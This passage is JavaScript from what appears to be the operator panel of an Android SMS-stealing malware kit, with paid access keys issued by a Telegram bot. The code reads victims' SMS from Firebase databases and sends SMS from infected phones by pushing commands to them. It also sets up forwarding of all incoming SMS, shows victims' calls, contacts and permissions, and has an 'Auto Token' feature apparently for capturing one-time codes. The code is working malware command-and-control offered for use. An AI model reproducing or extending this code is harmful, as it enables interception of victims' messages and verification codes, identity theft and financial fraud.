    '<button class="dev-tab" data-tab="forward" onclick="switchDevTab(\'forward\',this)">Forward</button>'+
    '</div>'+
    '<div class="dev-section active" id="devtab-sim"><div id="simList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-calls"><div id="callsList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-contacts"><div id="contactsList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-perms"><div id="permsList" class="data-list"></div></div>'+
    '<div class="dev-section" id="devtab-forward">'+
    '<label class="form-label"><input type="checkbox" id="fwToggle"/> Enable forwarding</label>'+
    '<input class="form-input" id="fwNumber" placeholder="Forward to number"/>'+
    '<label class="form-label"><input type="checkbox" id="fwAll" checked/> Forward all SMS</label>'+
    '<input class="form-input" id="fwFilters" placeholder="Filters (comma separated)"/>'+
    '<button class="btn-send" onclick="saveForward()" style="margin-top:10px">Save Forwarding</button>'+
    '<div id="fwList" class="data-list" style="margin-top:12px"></div></div>'+
    '<div style="margin-top:10px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
  ensureDevTabLoaded('sim');
}
function updateSendForm(){
  var d=getSelDev();
  document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
  document.getElementById('sendForm').classList.toggle('hidden',!d);
}

function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    else if(L.db&&L.ref){L.ref.off('value',L.h);L.ref.off('child_added',L.h);}
  });
  activeListeners={};
}
function loadSmsForDevice(){
  var d=getSelDev();if(!d)return;
  document.getElementById('smsEmpty').classList.add('hidden');
  clearListeners();
  var inst=getFbInstance(d.fbId);
  if(inst&&inst.schema==='rabel'){
    var path='messages/'+d.rawId;
    if(inst.db){
      var ref=inst.db.ref(path).limitToLast(80);
      var h=function(s){renderSmsFromData(s.val());};
      ref.on('value',h);activeListeners[d.id]={db:inst.db,ref:ref,h:h};
    }else{
      var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(renderSmsFromData);};
      tick();activeListeners[d.id]={timer:setInterval(tick,3000)};
    }
  }else{
    var p2=(d.deviceNode||'devices')+'/'+d.rawId+'/new_sms';
    var tick2=function(){restJson(inst.restUrl+'/'+p2+'.json').then(renderSmsFromData);};
    tick2();activeListeners[d.id]={timer:setInterval(tick2,3000)};
  }
}
function smsAsList(raw){
  if(!raw)return[];
  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
}
function normalizeSms(m){
  if(!m||typeof m!=='object')return null;
  var body=m.body||m.message||m.text||m.content||'';
  if(!body)return null;
  return{address:m.address||m.sender||m.from||m.number||'?',body:body,
    date_readable:m.date_readable||m.dateTime||m.time||'—',
    type:String(m.type||m.direction||'inbox').toLowerCase()};
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  list.sort(function(a,b){return String(b.date_readable).localeCompare(String(a.date_readable));});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  var d=getSelDev(),el=document.getElementById('smsList');
  if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
  if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
  el.innerHTML=window_sms.map(function(s,i){
    var out=s.type==='sent'||s.type==='outbox';
    return '<div class="sms-bubble '+(out?'out':'in')+'" style="animation-delay:'+(Math.min(i,12)*0.04)+'s">'+
      '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
      esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
  }).join('');
}

function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
  if(!to||!msg){toast('Fill number and message',false);return;}
  var btn=document.querySelector('.btn-send');
  document.getElementById('sendStatus').textContent='Sending...';
  if(btn){btn.classList.add('sending');btn.classList.remove('success');}
  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
  var payload={to:to,message:msg,from:1,isSended:false};
  if(inst.schema!=='rabel')path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    if(btn){btn.classList.remove('sending');}
    if(r.ok){
      document.getElementById('sendStatus').textContent='✅ Sent';document.getElementById('sendMsg').value='';
      if(btn){btn.classList.add('success');setTimeout(function(){btn.classList.remove('success');},500);}
      spawnConfetti(innerWidth/2,innerHeight*.55,24);toast('SMS sent',true);
    }else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
  }).catch(function(){
    if(btn)btn.classList.remove('sending');
    document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);
  });
}

var TAB_ORDER=['home','device','sms','send'],_lastTab='home';
function switchTab(name,btn){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
  var screen=document.getElementById('screen-'+name);
  if(screen)screen.classList.add('active');
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
  if(btn){btn.classList.add('active');moveNavGlow(btn);}
  else{
    var navBtn=document.querySelector('.nav-item[data-tab="'+name+'"]');
    if(navBtn){navBtn.classList.add('active');moveNavGlow(navBtn);}
  }
  _lastTab=name;
  if(name==='sms'&&selDev)loadSmsForDevice();
  if(name==='device')renderDeviceView();
  if(name==='send')updateSendForm();
}
function closeSideMenu(){
  var bg=document.getElementById('sideMenuBg'),menu=document.getElementById('sideMenu'),btn=document.getElementById('menuBtn');
  if(bg)bg.classList.remove('open');
  if(menu)menu.classList.remove('open');
  if(btn)btn.classList.remove('open');
}
function toggleSideMenu(){
  var menu=document.getElementById('sideMenu');
  if(menu&&menu.classList.contains('open')){closeSideMenu();return;}
  var bg=document.getElementById('sideMenuBg'),btn=document.getElementById('menuBtn');
  if(bg)bg.classList.add('open');
  if(menu)menu.classList.add('open');
  if(btn)btn.classList.add('open');
}
function menuGo(name){closeSideMenu();switchTab(name,null);}
function menuDevTab(name){
  closeSideMenu();
  if(!getSelDev()){toast('Pehle Home se device select karo',false);menuGo('home');return;}
  switchTab('device',null);
  setTimeout(function(){
    var btn=document.querySelector('.dev-tab[data-tab="'+name+'"]');
    switchDevTab(name,btn);
  },40);
}
function menuOpenFb(){closeSideMenu();openFbSheet();}
function menuToggleAutoToken(){closeSideMenu();toggleAutoToken();}
function menuSetAutoDevice(){closeSideMenu();useSelForAutoToken();}
function menuOpenAadhar(){closeSideMenu();openAadhar();}
function menuRefresh(){closeSideMenu();refreshData();}
function menuLogout(){closeSideMenu();doLogout();}

/* AUTH — server keys via RebelAndroid (bot /genkey on @Rebelpanelbot) */
function parseJson(s){try{return JSON.parse(s);}catch(e){return null;}}
function authFetch(body){
  body=body||{};
  return new Promise(function(resolve){
    if(!window.RebelAndroid){resolve({ok:false,data:{ok:false,error:'Not in APK'}});return;}
    try{
      if(body.action==='login'){
        var j=parseJson(RebelAndroid.login(body.key||''));
        resolve({ok:!!(j&&j.ok),data:j||{ok:false,error:'Invalid key'}});
      }else if(body.action==='check'){
        var c=parseJson(RebelAndroid.checkSession());
        resolve({ok:!!(c&&c.ok),data:c||{ok:false}});
      }else if(body.action==='logout'){
        RebelAndroid.logout();
        resolve({ok:true,data:{ok:true}});
      }else resolve({ok:false,data:{ok:false}});
    }catch(e){resolve({ok:false,data:{ok:false,error:'Auth error'}});}
  });
}
function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
function unlockApp(token,exp,remember){
  var s={token:token,exp:exp||0};
  if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
  var login=document.getElementById('loginScreen'),app=document.getElementById('appShell');
  var btn=document.getElementById('loginBtn');
  if(btn){var r=btn.getBoundingClientRect();spawnConfetti(r.left+r.width/2,r.top,48);}
  unlockFlash();
  login.classList.add('login-out');
  setTimeout(function(){
    login.classList.add('hidden');
    app.classList.remove('hidden');
    app.classList.add('app-enter');
    moveNavGlow(document.querySelector('.nav-item.active'));
    if(!panelReady){
      panelReady=true;
      if(!window._preloadStarted){fetchAllData();loadAutoTokenState();}
      updatePanelVersionBadge();
    }
  },380);
}
function doLogin(){
  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
  if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
  var btn=document.getElementById('loginBtn'),errEl=document.getElementById('loginErr');
  btn.disabled=true;btn.classList.add('loading');
  authFetch({action:'login',key:key}).then(function(res){
    btn.disabled=false;btn.classList.remove('loading');
    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
    errEl.textContent=res.data&&res.data.error||'Invalid key';
    errEl.style.display='block';
    errEl.classList.remove('shake');void errEl.offsetWidth;errEl.classList.add('shake');
  });
}
function doLogout(){
  if(window.RebelAndroid)RebelAndroid.logout();
  localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
  location.reload();
}
document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});

/* AUTO TOKEN — stored inside APK */
var _autoTokenOn=false;
function smsTokenFetch(body){
  body=body||{};
  if(body.action==='get'||body.action==='save'){
    return panelApiFetch({
      type:'sms_token',
      sub_action:body.action==='get'?'get':'save',
      enabled:body.enabled,
      device_id:body.device_id,
      database_url:body.database_url,
      fb_name:body.fb_name
    }).then(function(d){
      if(d&&d.ok&&d.log)_smsTokenLog=d.log;
      renderAutoTokenLog(_smsTokenLog);
      return{ok:!!(d&&d.ok),data:d};
    });
  }
  return Promise.resolve({ok:false});
}
function loadAutoTokenState(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.data&&d.data.ok){
      _autoTokenOn=!!(d.data.config&&d.data.config.enabled);
      document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
      _smsTokenLog=d.data.log||[];
      renderAutoTokenLog(_smsTokenLog);
    }
  });
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
}
function useSelForAutoToken(){
  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
  var inst=getFbInstance(d.fbId);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
    toast('Auto SMS device set',true);
  });
}

/* BOOT */
(function(){
  var BOOT_MS=2600;
  function hideBoot(){
    var s=document.getElementById('bootSplash');
    if(!s)return;
    s.classList.add('hide');
    setTimeout(function(){if(s.parentNode)s.parentNode.removeChild(s);},500);
  }
  function initFx(){
    initParallax();bindRipples();
    var nb=document.querySelector('.nav-item.active');if(nb)moveNavGlow(nb);
    requestAnimationFrame(function(){requestAnimationFrame(initParticles);});
  }
  function bootDone(){
    if(window.RebelAndroid&&RebelAndroid.splashAlreadyShown&&RebelAndroid.splashAlreadyShown()){
      return 600;
    }
    return BOOT_MS;
  }
  var IS_PRELOAD=/[?&]preload=1/.test(location.search)||(window.RebelAndroid&&RebelAndroid.isPreload&&RebelAndroid.isPreload());
  if(IS_PRELOAD){
    window.addEventListener('load',function(){startPanelPreload();});
    return;
  }
  window.addEventListener('load',function(){
    updatePanelVersionBadge();
    var ms=bootDone();
    var hasSession=false,sessionData=null;
    if(window.RebelAndroid){
      sessionData=parseJson(RebelAndroid.checkSession());
      if(sessionData&&sessionData.ok&&sessionData.token){
        hasSession=true;
        startPanelPreload();
      }
    }
    setTimeout(hideBoot,ms);
    setTimeout(initFx,ms);
    if(hasSession&&sessionData){
      setTimeout(function(){unlockApp(sessionData.token,sessionData.expires||sessionData.exp||0,true);},ms);
    }
  });
})();